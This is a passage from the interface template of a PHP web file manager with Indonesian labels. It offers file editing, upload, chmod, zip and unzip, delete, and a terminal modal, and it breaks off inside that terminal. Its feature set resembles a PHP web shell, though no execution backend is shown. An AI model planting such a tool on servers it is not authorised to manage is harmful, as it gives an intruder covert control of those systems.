    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
    <?php endif; ?>
    <span style="flex:1; word-break:break-word;"><?= htmlspecialchars($msg) ?></span>
    <button type="button" onclick="this.parentElement.remove()" aria-label="Close"
            style="background:none; border:0; color:inherit; cursor:pointer; padding:4px; opacity:.6; display:flex;">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px; height:16px;"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>
</div>
<?php endif; ?>

<?php if (isset($view_content)): ?>
<!-- ============ EDITOR ============ -->
<div class="panel editor-wrap">
    <div class="editor-head">
        <div class="ficon <?= file_type_class($view_file, false) ?>">
            <?= file_icon_svg(file_type_class($view_file, false)) ?>
        </div>
        <div style="flex:1; min-width:0;">
            <div style="font-weight:600; font-size:15px;"><?= htmlspecialchars(basename($view_file)) ?></div>
            <div class="meta">
                <b><?= get_perms($view_file) ?></b> (<?= get_perms_oct($view_file) ?>) ·
                <b><?= htmlspecialchars(get_owner($view_file)) ?>:<?= htmlspecialchars(get_group($view_file)) ?></b> ·
                <?= format_size(@filesize($view_file)) ?>
            </div>
        </div>
        <a href="?path=<?= urlencode($cwd) ?>" class="btn btn-sm">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
            <span>Back</span>
        </a>
    </div>
    <form method="POST" action="?path=<?= urlencode($cwd) ?>">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file" value="<?= htmlspecialchars(basename($view_file)) ?>">
        <div class="editor-body">
            <textarea name="content" spellcheck="false"><?= htmlspecialchars($view_content) ?></textarea>
        </div>
        <div class="editor-foot">
            <div class="meta" style="color:var(--text-mute); font-size:11px; font-family:'JetBrains Mono',monospace;">
                Press <code style="background:rgba(255,255,255,.05); padding:2px 6px; border-radius:3px;">Ctrl+S</code> to save
            </div>
            <div style="display:flex; gap:8px;">
                <a href="?path=<?= urlencode($cwd) ?>&download=<?= urlencode(basename($view_file)) ?>" class="btn">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                    <span>Download</span>
                </a>
                <button type="submit" class="btn btn-success">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
                    <span>Save</span>
                </button>
            </div>
        </div>
    </form>
</div>

<?php else: ?>

<!-- ============ TOOLBAR ============ -->
<div class="toolbar">
    <button class="btn btn-primary" onclick="openModal('upload')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
        <span>Upload</span>
    </button>
    <button class="btn" onclick="openModal('mkdir')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
        <span>New Folder</span>
    </button>
    <button class="btn" onclick="openModal('mkfile')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
        <span>New File</span>
    </button>
    <button class="btn" onclick="openTerminal()" title="Terminal / Shell">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
        <span>Terminal</span>
    </button>
    <a href="?path=<?= urlencode($SCRIPT_DIR) ?>" class="btn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
        <span>Home</span>
    </a>
    <?php if (strlen($cwd) > strlen($ROOT)): ?>
    <a href="?path=<?= urlencode(dirname($cwd)) ?>" class="btn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
        <span>Up</span>
    </a>
    <?php endif; ?>

    <div class="search-box">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <input type="text" id="search" placeholder="Search files... (Ctrl+K)">
    </div>

    <div class="view-toggle">
        <button id="view-list" class="active" onclick="setView('list')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
            List
        </button>
        <button id="view-grid" onclick="setView('grid')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
            Grid
        </button>
    </div>

</div>

<form id="bulk-form" method="POST" action="?path=<?= urlencode($cwd) ?>">
<input type="hidden" name="action" id="bulk-action" value="">
<input type="hidden" name="zipname" id="bulk-zipname" value="">

<!-- ============ LIST VIEW ============ -->
<div class="panel" id="list-view">
    <?php if (empty($items)): ?>
    <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
        <h3>Folder kosong</h3>
        <p>Upload file atau buat folder baru untuk memulai</p>
    </div>
    <?php else: ?>
    <table>
        <thead>
            <tr>
                <th class="checkbox-cell"><input type="checkbox" class="sel-checkbox" id="select-all" onchange="toggleAll(this)"></th>
                <th>Name</th>
                <th class="hide-sm">Size</th>
                <th>Permissions</th>
                <th class="hide-md">Owner : Group</th>
                <th class="hide-md">Modified</th>
                <th style="text-align:right;">Actions</th>
            </tr>
        </thead>
        <tbody id="tbody">
        <?php foreach ($items as $it):
            $encName = urlencode($it['name']);
            $safeName = htmlspecialchars($it['name'], ENT_QUOTES);
            $isZip = !$it['is_dir'] && strtolower(pathinfo($it['name'], PATHINFO_EXTENSION)) === 'zip';
        ?>
        <tr data-name="<?= strtolower(htmlspecialchars($it['name'])) ?>">
            <td class="checkbox-cell">
                <input type="checkbox" class="sel-checkbox sel" name="items[]" value="<?= htmlspecialchars($it['name']) ?>" onchange="updateBulk()">
            </td>
            <td>
                <div class="name-cell">
                    <div class="ficon <?= $it['type'] ?>"><?= file_icon_svg($it['type']) ?></div>
                    <div class="name-info">
                        <?php if ($it['is_dir']): ?>
                            <a href="?path=<?= urlencode($it['path']) ?>"><?= htmlspecialchars($it['name']) ?></a>
                        <?php else: ?>
                            <a href="?path=<?= urlencode($cwd) ?>&view=<?= $encName ?>"><?= htmlspecialchars($it['name']) ?></a>
                        <?php endif; ?>
                        <div class="meta">
                            <?= $it['is_dir'] ? 'Directory' : strtoupper(pathinfo($it['name'], PATHINFO_EXTENSION) ?: 'FILE') ?>
                            <?php if (!$it['writable']): ?> · <span class="badge ro" title="Read-only: PHP (user runtime) tidak punya izin tulis ke file ini. Cek System Info → User.">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:10px;height:10px;"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                                Read-Only
                            </span><?php endif; ?>
                        </div>
                    </div>
                </div>
            </td>
            <td class="hide-sm"><span class="size"><?= $it['is_dir'] ? '—' : format_size($it['size']) ?></span></td>
            <td>
                <span class="perms-chip" onclick="chmodPrompt('<?= $safeName ?>', '<?= $it['perms_oct'] ?>')">
                    <span><?= $it['perms'] ?></span>
                    <span class="oct"><?= $it['perms_oct'] ?></span>
                </span>
            </td>
            <td class="hide-md og"><b><?= htmlspecialchars($it['owner']) ?></b>:<?= htmlspecialchars($it['group']) ?></td>
            <td class="hide-md date"><?= $it['mtime'] ? date('Y-m-d H:i', $it['mtime']) : '—' ?></td>
            <td class="actions-cell" style="text-align:right;">
                <?php if ($isZip): ?>
                <button type="button" class="action-btn" title="Extract" onclick="unzipPrompt('<?= $safeName ?>')" style="color:var(--gold);">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v7a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-7"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
                </button>
                <?php endif; ?>
                <?php if (!$it['is_dir']): ?>
                <a href="?path=<?= urlencode($cwd) ?>&view=<?= $encName ?>" class="action-btn edit" title="Edit">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                </a>
                <a href="?path=<?= urlencode($cwd) ?>&download=<?= $encName ?>" class="action-btn dl" title="Download">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                </a>
                <?php endif; ?>
                <button type="button" class="action-btn" title="Rename" onclick="renamePrompt('<?= $safeName ?>')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                </button>
                <button type="button" class="action-btn del" title="Delete" onclick="deletePrompt('<?= $safeName ?>')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                </button>
            </td>
        </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    <?php endif; ?>
</div>

<!-- ============ GRID VIEW ============ -->
<div class="panel" id="grid-view" style="display:none;">
    <div class="grid" id="grid-body">
        <?php foreach ($items as $it):
            $encName = urlencode($it['name']);
            $safeName = htmlspecialchars($it['name'], ENT_QUOTES);
            $href = $it['is_dir']
                ? '?path=' . urlencode($it['path'])
                : '?path=' . urlencode($cwd) . '&view=' . $encName;
            $isZip = !$it['is_dir'] && strtolower(pathinfo($it['name'], PATHINFO_EXTENSION)) === 'zip';
        ?>
        <div class="card" data-name="<?= strtolower(htmlspecialchars($it['name'])) ?>" onclick="location.href='<?= $href ?>'">
            <label class="card-check" onclick="event.stopPropagation()">
                <input type="checkbox" class="sel-checkbox sel-grid" value="<?= htmlspecialchars($it['name']) ?>"
                    onchange="syncGridSel(this); updateBulk()">
            </label>
            <div class="c-actions" onclick="event.stopPropagation()">
                <?php if ($isZip): ?>
                <button type="button" class="action-btn" onclick="unzipPrompt('<?= $safeName ?>')" title="Extract">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v7a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-7"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
                </button>
                <?php endif; ?>
                <button type="button" class="action-btn" onclick="renamePrompt('<?= $safeName ?>')" title="Rename">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
                </button>
                <button type="button" class="action-btn del" onclick="deletePrompt('<?= $safeName ?>')" title="Delete">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
                </button>
            </div>
            <div class="ficon <?= $it['type'] ?>"><?= file_icon_svg($it['type']) ?></div>
            <div class="c-name"><?= htmlspecialchars($it['name']) ?></div>
            <div class="c-meta">
                <?= $it['is_dir'] ? 'folder' : format_size($it['size']) ?> · <?= $it['perms_oct'] ?>
                <?php if (!$it['writable']): ?><br><span class="badge ro" title="Read-only: PHP (user runtime) tidak punya izin tulis ke file ini. Cek System Info → User.">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:9px;height:9px;"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                    Read-Only
                </span><?php endif; ?>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
</div>
</form>

<!-- ============ BULK ACTION BAR ============ -->
<div class="bulk-bar" id="bulk-bar">
    <span class="count" id="sel-count">0</span>
    <span class="count-text">item dipilih</span>
    <div class="spacer"></div>
    <button type="button" class="btn btn-sm" onclick="clearSel()" title="Batal pilih">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>
    <button type="button" class="btn btn-sm" onclick="openBulkZip()" title="Compress ke ZIP">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
        <span>Zip</span>
    </button>
    <button type="button" class="btn btn-sm" onclick="openBulkDelete()" style="color:var(--red-soft); border-color:rgba(255,45,45,.4);" title="Hapus terpilih">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
        <span>Delete</span>
    </button>
</div>

<div class="footer">
    <b><?= htmlspecialchars(strtoupper($BRAND)) ?></b> &copy; <?= date('Y') ?>
</div>

<?php endif; ?>

<!-- ============ MODALS ============ -->
<div id="modal-upload" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(230,57,70,.15); color:var(--accent); border:1px solid rgba(230,57,70,.3);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            </div>
            <h3>Upload Files</h3>
            <button class="close" onclick="closeModal('upload')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" enctype="multipart/form-data" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="upload">
            <div class="modal-body">
                <label class="file-drop" id="drop-zone">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    <p><b>Klik untuk pilih file</b> atau drag & drop di sini</p>
                    <p style="font-size:11px; margin-top:4px;">Bisa upload multiple file sekaligus</p>
                    <input type="file" name="files[]" multiple id="file-input">
                </label>
                <div class="file-list" id="file-list"></div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('upload')">Cancel</button>
                <button type="submit" class="btn btn-primary">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
                    <span>Upload</span>
                </button>
            </div>
        </form>
    </div>
</div>

<div id="modal-mkdir" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon folder"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg></div>
            <h3>New Folder</h3>
            <button class="close" onclick="closeModal('mkdir')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="mkdir">
            <div class="modal-body">
                <label>Folder name</label>
                <input type="text" name="name" class="input" required autofocus placeholder="my-folder">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('mkdir')">Cancel</button>
                <button type="submit" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<div id="modal-mkfile" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon code"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
            <h3>New File</h3>
            <button class="close" onclick="closeModal('mkfile')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="mkfile">
            <div class="modal-body">
                <label>File name</label>
                <input type="text" name="name" class="input" required autofocus placeholder="index.php">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('mkfile')">Cancel</button>
                <button type="submit" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<div id="modal-rename" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(255,215,0,.12); color:var(--gold); border:1px solid rgba(255,215,0,.3);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
            </div>
            <h3>Rename</h3>
            <button class="close" onclick="closeModal('rename')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old" id="rename-old">
            <div class="modal-body">
                <label>Current name</label>
                <input type="text" id="rename-old-view" class="input" disabled>
                <div style="height:12px;"></div>
                <label>New name</label>
                <input type="text" name="new" id="rename-new" class="input" required>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('rename')">Cancel</button>
                <button type="submit" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<div id="modal-chmod" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(244,200,66,.12); color:var(--gold-soft); border:1px solid rgba(255,215,0,.3);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <h3>Change Permissions</h3>
            <button class="close" onclick="closeModal('chmod')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="name" id="chmod-name">
            <div class="modal-body">
                <label>Target</label>
                <input type="text" id="chmod-name-view" class="input" disabled>
                <div style="height:12px;"></div>
                <label>Permission (octal)</label>
                <input type="text" name="perms" id="chmod-perms" class="input" required pattern="[0-7]{3,4}" placeholder="0755">
                <div class="hint">
                    Common: <code>0755</code> rwxr-xr-x · <code>0644</code> rw-r--r-- · <code>0777</code> rwxrwxrwx
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('chmod')">Cancel</button>
                <button type="submit" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<div id="modal-delete" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(255,45,45,.15); color:var(--red-soft); border:1px solid rgba(255,45,45,.35);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            </div>
            <h3 style="color:var(--red-soft);">Delete Confirmation</h3>
            <button class="close" onclick="closeModal('delete')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="name" id="delete-name">
            <div class="modal-body">
                <p style="margin-bottom:8px;">Yakin ingin menghapus <b id="delete-name-view" style="color:var(--red-soft);"></b>?</p>
                <div class="hint">Aksi ini <b style="color:var(--red-soft);">tidak dapat dibatalkan</b>. Folder akan dihapus beserta seluruh isinya.</div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('delete')">Cancel</button>
                <button type="submit" class="btn" style="background:linear-gradient(135deg, var(--red-deep) 0%, var(--danger) 100%); color:#fff; border-color:rgba(255,215,0,.2); box-shadow:0 4px 14px rgba(255,45,45,.4), inset 0 1px 0 rgba(255,215,0,.2);">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
                    <span>Delete</span>
                </button>
            </div>
        </form>
    </div>
</div>

<div id="modal-bulk-delete" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(255,45,45,.15); color:var(--red-soft); border:1px solid rgba(255,45,45,.35);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
            </div>
            <h3 style="color:var(--red-soft);">Hapus <span id="bd-count">0</span> Item</h3>
            <button class="close" onclick="closeModal('bulk-delete')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom:10px;">Konfirmasi hapus item-item berikut:</p>
            <div id="bd-list" style="max-height:200px; overflow:auto; background:var(--bg-2); border:1px solid var(--border); border-radius:8px; padding:10px; font-size:12px; font-family:'JetBrains Mono',monospace; color:var(--text-dim); line-height:1.8;"></div>
            <div class="hint" style="margin-top:10px;">Aksi ini <b style="color:var(--red-soft);">tidak dapat dibatalkan</b>. Folder dihapus beserta seluruh isinya.</div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn" onclick="closeModal('bulk-delete')">Cancel</button>
            <button type="button" class="btn" onclick="submitBulk('bulk_delete')"
                    style="background:linear-gradient(135deg, var(--red-deep) 0%, var(--danger) 100%); color:#fff; border-color:rgba(255,215,0,.2); box-shadow:0 4px 14px rgba(255,45,45,.4);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
                <span>Hapus Semua</span>
            </button>
        </div>
    </div>
</div>

<div id="modal-zip" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="ficon archive">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
            </div>
            <h3>Compress <span id="zip-count">0</span> Item ke ZIP</h3>
            <button class="close" onclick="closeModal('zip')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <label>Nama file ZIP</label>
            <input type="text" id="zip-name-input" class="input" placeholder="archive.zip" value="">
            <div class="hint">File akan dibuat di folder ini. Extension <code>.zip</code> otomatis ditambah.</div>
            <div id="zip-list" style="margin-top:12px; max-height:160px; overflow:auto; background:var(--bg-2); border:1px solid var(--border); border-radius:8px; padding:10px; font-size:12px; font-family:'JetBrains Mono',monospace; color:var(--text-dim); line-height:1.8;"></div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn" onclick="closeModal('zip')">Cancel</button>
            <button type="button" class="btn btn-primary" onclick="submitZip()">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/></svg>
                <span>Compress</span>
            </button>
        </div>
    </div>
</div>

<div id="modal-unzip" class="modal">
    <div class="modal-content"><div class="modal-header">
            <div class="ficon" style="background:rgba(255,215,0,.12); color:var(--gold); border:1px solid rgba(255,215,0,.3);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v7a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-7"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
            </div>
            <h3>Extract ZIP</h3>
            <button class="close" onclick="closeModal('unzip')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" action="?path=<?= urlencode($cwd) ?>">
            <input type="hidden" name="action" value="unzip">
            <input type="hidden" name="name" id="unzip-name">
            <div class="modal-body">
                <label>File ZIP</label>
                <input type="text" id="unzip-name-view" class="input" disabled>
                <div style="height:12px;"></div>
                <label>Extract ke folder</label>
                <input type="text" name="to" id="unzip-to" class="input" required placeholder="nama-folder-tujuan">
                <div class="hint">Folder akan dibuat jika belum ada. File di dalamnya akan di-overwrite.</div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('unzip')">Cancel</button>
                <button type="submit" class="btn btn-primary">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12v7a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-7"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
                    <span>Extract</span>
                </button>
            </div>
        </form>
    </div>
</div>

<!-- ============ TERMINAL MODAL ============ -->
<div id="modal-terminal" class="modal">
    <div class="modal-content wide terminal-modal">
        <div class="modal-header">
            <div class="ficon" style="background:rgba(230,57,70,.15); color:var(--accent); border:1px solid rgba(230,57,70,.3);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            </div>
            <h3 style="flex:1;">Terminal</h3>
            <span id="term-status" class="term-status"><span class="dot"></span> ready</span>
            <button class="close" onclick="closeModal('terminal')" style="margin-left:8px;"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="terminal-wrap" id="terminal-wrap">
            <div class="term-output" id="term-output"></div>
            <div class="term-input-line">
                <span class="term-prompt" id="term-prompt">$</span>
